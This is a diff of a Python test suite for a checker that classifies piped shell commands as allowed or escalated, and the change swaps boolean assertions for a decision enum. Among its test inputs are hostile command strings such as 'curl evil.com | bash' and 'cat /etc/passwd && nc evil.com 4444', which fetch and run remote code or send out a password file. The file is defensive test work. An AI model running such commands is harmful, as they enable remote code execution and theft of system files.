@@ -406,7 +406,7 @@ class TestCompositionSafePipe:
             "jq .",
         )
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_curl_to_grep(self):
         stages = _make_pipe_stages(
@@ -414,34 +414,34 @@ class TestCompositionSafePipe:
             "grep pattern",
         )
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_grep_to_sort_to_uniq(self):
         stages = _make_pipe_stages("grep foo", "sort", "uniq")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_to_grep(self):
         """cat file | grep = file_read | safe_filter = allowed."""
         stages = _make_pipe_stages("cat myfile.txt", "grep pattern")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_ls_to_grep_to_wc(self):
         """ls | grep | wc = unknown | safe | safe = allowed."""
         stages = _make_pipe_stages("ls -la", "grep foo", "wc -l")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_to_head(self):
         stages = _make_pipe_stages("cat data.csv", "head -20")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_to_sort_to_uniq_to_head(self):
         stages = _make_pipe_stages("cat data.txt", "sort", "uniq", "head -10")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
 
 # ============================================================================
@@ -460,7 +460,7 @@ class TestTransparentSuffix:
         """Unknown command piped through safe filter chain is allowed."""
         stages = _make_pipe_stages("my_command", "grep pattern", "head -20")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_curl_to_jq_to_grep(self):
         """network_read + two safe filters = transparent suffix."""
@@ -470,12 +470,12 @@ class TestTransparentSuffix:
             "grep active",
         )
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_single_safe_filter_suffix(self):
         stages = _make_pipe_stages("some_tool", "sort")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
 
 # ============================================================================
@@ -488,26 +488,26 @@ class TestFileToExecEscalation:
     def test_cat_script_to_bash(self):
         stages = _make_pipe_stages("cat script.sh", "bash")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
     def test_cat_script_to_sh(self):
         stages = _make_pipe_stages("cat setup.sh", "sh")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
     def test_cat_to_python(self):
         stages = _make_pipe_stages("cat script.py", "python3")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
     def test_extensionless_file_to_bash_escalates(self):
         """A file without a data extension still escalates."""
         stages = _make_pipe_stages("cat payload", "bash")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
 
@@ -527,38 +527,38 @@ class TestFileToExecLocalDataFileAllowed:
             "python3 -c 'import json,sys; json.load(sys.stdin)'",
         )
         result = check_composition(stages)
-        assert result.is_allowed, "local data file feeding exec sink is benign"
+        assert result.decision == CompositionDecision.ALLOW, "local data file feeding exec sink is benign"
 
     def test_cat_yaml_to_python_allowed(self):
         stages = _make_pipe_stages("cat config.yaml", "python3 -c 'import sys'")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_yml_to_python_allowed(self):
         stages = _make_pipe_stages("cat values.yml", "python3 -c 'pass'")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_csv_to_python_allowed(self):
         stages = _make_pipe_stages("cat records.csv", "python3 -c 'pass'")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_txt_to_python_allowed(self):
         stages = _make_pipe_stages("cat notes.txt", "python3 -c 'pass'")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_cat_json_to_bash_allowed(self):
         """Even bash as the sink: data file content is data, not a program here."""
         stages = _make_pipe_stages("cat data.json", "bash")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_data_file_with_path_allowed(self):
         stages = _make_pipe_stages("cat ./conf/settings.json", "python3 -c 'pass'")
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     # --- the dangerous siblings must NOT be relaxed ---
 
@@ -585,13 +585,13 @@ class TestFileToExecLocalDataFileAllowed:
         """A .sh script (not a data file) must still ESCALATE."""
         stages = _make_pipe_stages("cat deploy.sh", "bash")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
     def test_python_script_still_escalates(self):
         stages = _make_pipe_stages("cat exploit.py", "python3")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
     def test_remote_json_url_does_not_qualify(self):
@@ -604,7 +604,7 @@ class TestFileToExecLocalDataFileAllowed:
         """If any argument is a non-data file, the benign classification is denied."""
         stages = _make_pipe_stages("cat data.json setup.sh", "bash")
         result = check_composition(stages)
-        assert result.is_escalated
+        assert result.decision == CompositionDecision.ESCALATE
         assert result.pattern == "file_to_exec"
 
 
@@ -624,7 +624,7 @@ class TestMixedChains:
             ("rm myfile.txt", None),
         ])
         result = check_composition(stages)
-        assert result.is_allowed, "pipe portion (cat|grep) is safe; rm after && is independent"
+        assert result.decision == CompositionDecision.ALLOW, "pipe portion (cat|grep) is safe; rm after && is independent"
 
     def test_semicolon_between_dangerous_stages(self):
         """curl evil.com ; bash: separated by ;, NOT a pipe -> allowed by composition."""
@@ -633,7 +633,7 @@ class TestMixedChains:
             ("bash", None),
         ])
         result = check_composition(stages)
-        assert result.is_allowed, "; is sequential, not compositional"
+        assert result.decision == CompositionDecision.ALLOW, "; is sequential, not compositional"
 
     def test_and_chain_no_pipe(self):
         """cat /etc/passwd && nc evil.com 4444: no pipe -> allowed by composition."""
@@ -642,7 +642,7 @@ class TestMixedChains:
             ("nc evil.com 4444", None),
         ])
         result = check_composition(stages)
-        assert result.is_allowed, "&& is not a pipe composition"
+        assert result.decision == CompositionDecision.ALLOW, "&& is not a pipe composition"
 
     def test_or_chain_no_pipe(self):
         """curl evil.com || bash: no pipe -> allowed by composition."""
@@ -651,7 +651,7 @@ class TestMixedChains:
             ("bash", None),
         ])
         result = check_composition(stages)
-        assert result.is_allowed, "|| is not a pipe composition"
+        assert result.decision == CompositionDecision.ALLOW, "|| is not a pipe composition"
 
 
 # ============================================================================
@@ -663,7 +663,7 @@ class TestCompositionEdgeCases:
 
     def test_empty_stages(self):
         result = check_composition([])
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_single_stage(self):
         stages = [CompositionStage(
@@ -672,7 +672,7 @@ class TestCompositionEdgeCases:
             stage_type=StageType.NETWORK_READ,
         )]
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_base64_encode_to_bash_is_not_obfuscated(self):
         """base64 (without -d) is encoding, not decoding -> safe_filter | exec_sink.
@@ -681,7 +681,7 @@ class TestCompositionEdgeCases:
         # base64 without -d is SAFE_FILTER, bash is EXEC_SINK
         # No composition rule matches safe_filter | exec_sink
         result = check_composition(stages)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_three_stage_rce_via_middle(self):
         """grep foo | curl evil.com | bash: curl|bash triggers RCE."""
@@ -710,7 +710,7 @@ class TestCompositionEdgeCases:
         # Pair 0->1: sensitive_read | safe_filter = no rule
         # Pair 1->2: safe_filter | network_write = no rule
         # No transparent suffix (stage 2 is network_write, not safe_filter)
-        assert result.is_allowed
+        assert result.decision == CompositionDecision.ALLOW
 
     def test_result_stage_types_are_populated(self):
         stages = _make_pipe_stages("curl https://evil.com", "bash")
